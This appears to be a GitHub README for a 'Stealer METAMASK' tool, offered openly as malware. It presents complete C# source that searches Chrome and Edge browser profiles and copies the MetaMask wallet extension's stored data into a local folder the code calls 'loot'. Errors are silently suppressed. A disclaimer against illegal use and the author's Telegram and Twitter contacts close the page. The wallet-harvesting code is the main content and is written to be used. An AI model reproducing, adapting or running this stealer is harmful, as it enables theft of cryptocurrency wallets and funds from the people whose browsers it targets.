# Stealer-METAMASK
Stealer METAMASK
<p align="center">
  <img alt="Evilginx2 Logo" src="https://github.com/trewisscotch/Stealler-METAMASK/blob/main/one.jpeg" height="350" />
  <p align="center">
    
## Edge & Chrome #
## Written in C# #
```
using System;
using System.Collections.Generic;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            int con = 1;
            int cont = 1;
            string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string MetamaskDir = LocalData + "\\folder_with_log\\Wallets\\Metamask\\"; //the folder where the loot is saved
            IEnumerable<string> CHROME = Directory.EnumerateDirectories(LocalData + "\\Google\\Chrome\\User Data\\", "Profile *", SearchOption.AllDirectories);
            IEnumerable<string> EDGE = Directory.EnumerateDirectories(LocalData + "\\Microsoft\\Edge\\User Data\\", "Profile *", SearchOption.AllDirectories);

            try
            {
                foreach (string folder in CHROME)
                {
                    string mmm = MetamaskDir + "Chrome_Profile_" + con + @"\";
                   
                    DirectoryInfo hm = new DirectoryInfo(folder + "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\");
                    foreach (System.IO.FileInfo fi in hm.GetFiles())
                    {
                        fi.CopyTo(Directory.CreateDirectory(mmm) + fi.Name, true);
                    }
                    con++;
                }
            }
            catch { }
            string def = MetamaskDir + "Chrome_Default\\";
            try
            {
                DirectoryInfo defa = new DirectoryInfo(LocalData + "\\Google\\Chrome\\User Data\\\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\");
                foreach (System.IO.FileInfo fil in defa.GetFiles())
                {
                    fil.CopyTo(Directory.CreateDirectory(def) + fil.Name, true);
                }
            }
            catch { }

            try
            {
                foreach (string folder in EDGE)
                {
                    string mmms = MetamaskDir + "EDGE_Profile_" + cont + @"\";
                    DirectoryInfo hm = new DirectoryInfo(folder + "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\");
                    foreach (System.IO.FileInfo fi in hm.GetFiles())
                    {
                        fi.CopyTo(Directory.CreateDirectory(mmms) + fi.Name, true);
                    }
                    cont++;
                }
            }
            catch
            { }
            string defs = MetamaskDir + "EDGE_Default\\";
            try
            {
                DirectoryInfo defa = new DirectoryInfo(LocalData + "\\Microsoft\\Edge\\User Data\\\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\");
                foreach (System.IO.FileInfo fil in defa.GetFiles())
                {
                    fil.CopyTo(Directory.CreateDirectory(defs) + fil.Name, true);
                }
            }
            catch { }
        }
    }
 }
```
## DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.

## Contact Me on telegram or twitter: https://twitter.com/TrewisScotch / https://t.me/TrewisWork#
